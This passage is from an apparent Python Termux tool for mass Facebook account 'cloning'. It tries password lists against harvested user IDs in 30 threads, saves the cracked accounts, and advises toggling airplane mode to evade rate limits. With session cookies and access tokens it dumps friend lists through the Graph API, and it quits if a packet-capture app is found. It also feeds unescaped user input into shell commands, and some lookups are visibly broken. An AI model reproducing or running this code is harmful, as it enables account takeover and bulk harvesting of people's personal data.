                        for cd in range(int(pl)):
                                passlist.append(input(f' ({cd+1}) Password : '))
                os.system('clear')
                print(logo);xchker()
                print(' Total Ids : '+str(len(self.id)))
                print(' Cloning Is Started Wait For Results')
                print(' After Every 5 Min Turn Airplane On/Off')
                print(50*'-')
                with ThreadPool(max_workers=30) as formSubmit:
                        for user in self.id:
                                iid,name = user.split('|')
                                formSubmit.submit(self.m1,iid,name,passlist)
                print(50*'-')
                print(' SucessFully Process Is Completed ')
                print(' Total Ok Ids : '+str(len(ok)))
                print(' Ok Ids Save In : /sdcard/SSB_ok.txt')
                print(50*'-')
                input('\n Press enter to back ')
                main()

def create_file():
        os.system('clear')
        print(logo);xchker()
        print(' [1] Create File ')
        print(' [2] Remove Double Ids ')
        print(' [3] Seprate Ids ')
        print(' [0] Back')
        print(50*'-')
        create_ = input(' Select : ')
        if create_ == "1":
                create_file_login()
        elif create_ == "2":
                double()
        elif create_ == "3":
                sep()
        elif create_ == "0":
                main()
        else:
                exit('invalid select')
        mycrackistan() 

def create_file_login():
        ids = []
        total = []
        xyz = requests.Session()
        os.system('clear')
        print(logo);xchker()
        try:
                cok = open('fb_cookies.txt','r').read()
                cookies = {'cookie':cok}
                access_token = open('access_token.txt', 'r').read()
        except FileNotFoundError:
                login()
        try:
                check_cookies = xyz.get('https://graph.facebook.com/me?access_token='+access_token,cookies=cookies).text
                load = json.loads(check_cookies)
                iid = load['https://www.facebook.com/liveyou.shar?mibextid=ZbWKwL']
                name = load['Sattar']
        except KeyError:
                print('\n Cookies has expired')
                time.sleep(1)
                os.system('rm -rf .fb_cookies.txt .access_token.txt')
                login()
        except requests.exceptions.ConnectionError:
                print(' No internet connection ...')
        os.system('clear')
        print(logo);xchker()
        print("[1] Create File Mix Ids")
        print("[2] Create File New Ids")
        print(44*"-")
        typp = input('select : ')
        if typp == "1":
                auto_file(cookies,access_token)
        elif typp == "2":
                new_file(cookies,access_token)
        else:
                auto_file(cookies,access_token)

def auto_file(cookies,access_token):
        global total
        os.system('clear & rm -rf .txt .temp.txt')
        os.system('clear')
        print(logo);xchker()
        try:
                fl = 1
        except:
                fl = 1
        for xd in range(fl):
                idt = input(f' Put id {xd+1}: ')
                try:
                        fd_url = 'https://graph.facebook.com/%s?fields=friends.fields(id,name)&access_token=%s'%(idt,access_token)
                        xyz = requests.Session()
                        r = xyz.get(fd_url,cookies=cookies).text
                        q = json.loads(r)
                        for iid in q['friends']['data']:
                                uid = iid['id']
                                open('.txt','a').write(uid+'\n')
                except KeyError:
                        print(' No Friend List : '+idt)
                        time.sleep(3)
                        return auto_file(cookies,access_token)
                except requests.exceptions.ConnectionError:
                        print(' No internet connection ....')
        sid = "1"
        os.system('cat .txt | grep "'+sid+'" > .temp.txt')
        file = open('.temp.txt','r').read().splitlines()
        print('\n \033[1;97m /sdcard/xxx1.txt \033[0;97m\n')
        #100010138361148
        sf = input(' Saved File As : ')
        print('')
        os.system('clear')
        print(logo);xchker()
        print(' Total ids To Dump: '+str(len(file)))
        print(' Dumping Is Started Wait ....')
        print(50*'-')
        with ThreadPool(max_workers=20) as yaari:
                for exid in file:
                        yaari.submit(iamBadBoy, exid,cookies,access_token,sf)
        print(' Total ids Extracted : '+str(len(total)))
        input(' Press enter to back ')
        main()

def new_file(cookies,access_token):
        global total
        os.system('clear & rm -rf .txt .temp.txt')
        os.system('clear')
        print(logo);xchker()
        try:
                fl = 1
        except:
                fl = 1
        for xd in range(fl):
                idt = input(f' Put id {xd+1}: ')
                try:
                        fd_url = 'https://graph.facebook.com/%s?fields=friends.fields(id,name)&access_token=%s'%(idt,access_token)
                        xyz = requests.Session()
                        r = xyz.get(fd_url,cookies=cookies).text
                        q = json.loads(r)
                        for iid in q['friends']['data']:
                                uid = iid['id']
                                open('.txt','a').write(uid+'\n')
                except KeyError:
                        print(' No Friend List : '+idt)
                        time.sleep(3)
                        return auto_file(cookies,access_token)
                except requests.exceptions.ConnectionError:
                        print(' No internet connection ....')
        print('\n\033[1;92m Example: 100087,100088 etc\033[0;97m')
        try:
                sl = int(input('\n How Many Links To Grab : '))
        except:
                sl = 1
        for el in range(sl):
                sid = input(f' Put {el+1} link: ')
                os.system('cat .txt | grep "'+sid+'" > .temp.txt')
        file = open('.temp.txt','r').read().splitlines()
        print('\n \033[1;97m /sdcard/.txt \033[0;97m\n')
        #100010138361148
        sf = input(' Saved File As : ')
        print('')
        os.system('clear')
        print(logo);xchker()
        print(' Total ids To Dump: '+str(len(file)))
        print(' Dumping Is Started Wait ....')
        print(50*'-')
        with ThreadPool(max_workers=20) as yaari:
                for exid in file:
                        yaari.submit(iamBadBoy, exid,cookies,access_token,sf)
        try:
                son = f"qaiser{str(random.randint(0,90))}.txt"
        except:
                son = f"qaiser{str(random.randint(10,50))}.txt"
        os.system(f'cat {sf} | grep "'+sid+'" > /sdcard/'+son+'')
        print(' Total ids Extracted : '+str(len(total)))
        print(' New ids Saved As : /sdcard/'+son)
        print(' Normal ids Saved As : '+sf)
        input(' Press enter to back ')
        main()

def iamBadBoy(exid,cookies,access_token,sf):
        try:
                global total,loop
                fd_url = 'https://graph.facebook.com/%s?fields=friends.fields(id,name)&access_token=%s'%(exid,access_token)
                xyz = requests.Session()
                r = xyz.get(fd_url,cookies=cookies).text
                q = json.loads(r)
                for yaad in q['friends']['data']:
                        iid = yaad['id']
                        name = yaad['name']
                        total.append(iid)
                        open(sf,'a').write(iid+'|'+name+'\n')
                loop+=1
                sys.stdout.write('\r Dumping Ids [%s] : [%s]\r'%(loop,len(total)));sys.stdout.flush()
        except requests.exceptions.ConnectionError:
                print(' No internet connection ...')
        except Exception as e:
                pass
                #print(e)
        except KeyError:
                pass

def sep():
        xchker()
        os.system('clear');print(logo);xchker()
        try:
                limit = int(input(' How many links do you want to separate ? '))
        except:
                limit = 1
        print(f'{rg} File Path Example /sdcard/xxx.txt{s}')
        file_name = input('\033[0m Input file path : ')
        print(f'{rg} Save As Example /sdcard/newfile.txt{s}')
        new_save = input('\033[0m Save new file as : ')
        y = 0
        print(f"{ro} Ids To Grabb Ex [ 100087,10000,10006 etc ]{s}")
        for k in range(limit):
                y+=1
                links=input(' Put Uid Type : ')
                os.system('cat '+file_name+' | grep "'+links+'" >> '+new_save)
        print(44*"\033[0m-")
        print(f'{rc} ids grabbed successfully{s}')
        print(' Total grabbed ids :\033[0;33m '+str(len(open(new_save).read().splitlines())))
        print('\033[0m New file saved as : \033[0;33m '+new_save)
        print(44*"\033[0m-")
        input('\033[0m[Press enter to back] ')
        main()

def double():
        os.system('clear')
        print(logo);xchker()
        user_file = input('File Path : ')
        try:
                open(user_file,'r').read()
                print(' \n\033[1;97mExample: /sdcard/xxx.txt\n\033[0;97m')
                save_file = input('Save new file as: ')
                os.system('touch '+save_file)
                os.system('sort -r '+user_file+' | uniq > '+save_file)
                print(50*'-')
                print(' Fully Removed Multi Lines Ids')
                print(' Dublicate Lines Removed From File')
                print(' File Saved As : '+save_file)
                print(50*'-')
                input('Press enter to back ')
                main()
        except FileNotFoundError:
                print(' Invalid File ')

#----[http-capture]----
try:
        a = "anar"
        t="tt"
        fileee = os.listdir('/sdcard/Android/data/')
        if f'com.h{t}pc{a}y.pro' in fileee:
                print('error occur 0')
                exit()
                exit(f'\nsomethiiing went wrong\n\nContact Admin : 03201134456')
except Exception as e:
        print(e)
        pass
except PermissionError:
        pass


'''#----[if-fork]------
pat = os.getcwd()
datar = []
datar.append(pat)
if '/data/data/com.termux/files/home/SATTAR' in datar:
        pass
else:
        for i in range(5000):
                print(" data is forked / or in other file")
        exit("Type > cd ~ && python ASB.py")

if not os.path.exists('.fam'):
        qsbuy()
else:
        qsbuy()
'''
main()